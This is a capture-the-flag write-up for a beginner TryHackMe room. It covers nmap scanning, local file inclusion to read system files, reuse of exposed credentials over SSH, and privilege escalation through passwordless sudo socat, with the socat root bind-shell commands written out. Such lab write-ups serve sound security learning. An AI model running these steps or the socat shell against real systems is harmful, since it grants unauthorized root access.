# Inclusion, by N3PH1L4X
This was a pretty fun room, it consists on basic local file inclusion and a little bit of post-exploitation enumeration. As its description states: it's for beginners, so this is a good room to learn and practice LFI. Let's start.
> Room link: https://tryhackme.com/room/inclusion

## Scanning
First of all we run a common nmap port scan:
~~~
nmap 10.10.115.231 -p- -n --min-rate=1000 --open -vvv
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 20:46 -04
Initiating Ping Scan at 20:46
Scanning 10.10.115.231 [2 ports]
Completed Ping Scan at 20:46, 0.36s elapsed (1 total hosts)
Initiating Connect Scan at 20:46
Scanning 10.10.115.231 [65535 ports]
Discovered open port 80/tcp on 10.10.115.231
Discovered open port 22/tcp on 10.10.115.231
Connect Scan Timing: About 27.62% done; ETC: 20:48 (0:01:21 remaining)
Connect Scan Timing: About 55.55% done; ETC: 20:48 (0:00:49 remaining)
Completed Connect Scan at 20:48, 119.38s elapsed (65535 total ports)
Nmap scan report for 10.10.115.231
Host is up, received syn-ack (0.68s latency).
Scanned at 2021-08-08 20:46:47 -04 for 120s
Not shown: 40635 filtered ports, 24898 closed ports
Reason: 40635 no-responses and 24898 conn-refused
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 119.79 seconds
~~~

Here we can see there are two open ports, let's scan those ports:
~~~
nmap 10.10.115.231 -p22,80 -n -sV -sC -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 21:03 -04
Nmap scan report for 10.10.115.231
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.31 seconds
~~~

There are two running services on those ports, let's check the web page on port 80:
![image](https://user-images.githubusercontent.com/71483185/128653032-7caa3e8e-b8fd-4209-aa62-34be834b88ba.png)

It's a blog with a few entries explaining some attack vectors, let's have a look on the LFI entry:
![image](https://user-images.githubusercontent.com/71483185/128653078-4adf894d-a7e9-48ea-a405-858b9e4c2ab8.png)

## Exploitation
Well that looks strange... The url might be useful. Let's try checking if we can view files outside the web directory:
![image](https://user-images.githubusercontent.com/71483185/128656392-1773d004-92f0-4619-8ec7-aaa52f299bfc.png)
We certainly can, there is an user listed there. We can know that by searching user IDs (UID) from 1000 and over.

Also there is what seems to be an user/password combination. What if we try that on the SSH port?
![image](https://user-images.githubusercontent.com/71483185/128653830-a0f74821-522e-4092-80f2-be5c3e2b846b.png)<br>
There it is. We have broke in.

And here is our user flag file.<br>
![image](https://user-images.githubusercontent.com/71483185/128654253-15acb8cb-7f88-4482-b1b9-02131c1dfb6d.png)

## Privilege escalation
Now all we have to do is escalate privileges. Are we sudoers?
![image](https://user-images.githubusercontent.com/71483185/128654678-d2752cb2-f411-49c4-83f0-8d229ba2b90c.png)<br>
Yes! And we can use socat as superuser without providing a password.

Let's have a look on what socat is:<br>
![image](https://user-images.githubusercontent.com/71483185/128654840-7e5b549c-1a07-4602-afa7-469ada3918b3.png)<br>
> Source: https://www.redhat.com/sysadmin/getting-started-socat

It seems like we can establish a TCP connection using this tool. Let's try this on our victim's machine:
~~~
sudo socat TCP4-LISTEN:4444,reuseaddr EXEC:"/bin/bash"
~~~
This command is going to run socat as superuser, is going to setup a TCP listener on port 4444 and start /bin/bash (the victim's shell) when it catches a connection.<br>
![image](https://user-images.githubusercontent.com/71483185/128655592-a0f1d434-3a25-43af-a112-f04ea7b7e13f.png)<br>
Listener is awaiting for connection.<br>

Now we are going to run this command on our attacker's machine:<br>
~~~
socat – TCP4:10.10.115.231:4444
~~~
It's gonna try establish a TCP connection to the IP provided, in my case it's 10.10.115.231 on port 4444.
![image](https://user-images.githubusercontent.com/71483185/128655879-ab879bbd-32c9-4bc1-bb03-bdcd052bb4fa.png)<br>
And there it is!

All we need to do now is find our root flag file!<br>
![image](https://user-images.githubusercontent.com/71483185/128655960-c06830f1-a05e-4e24-aa75-3bcdb6a7999b.png)

## Finishing off
That's it! As I said before, this is a pretty easy but fun room, very useful for learning and practicing LFI.
Thank you for reading this write up!
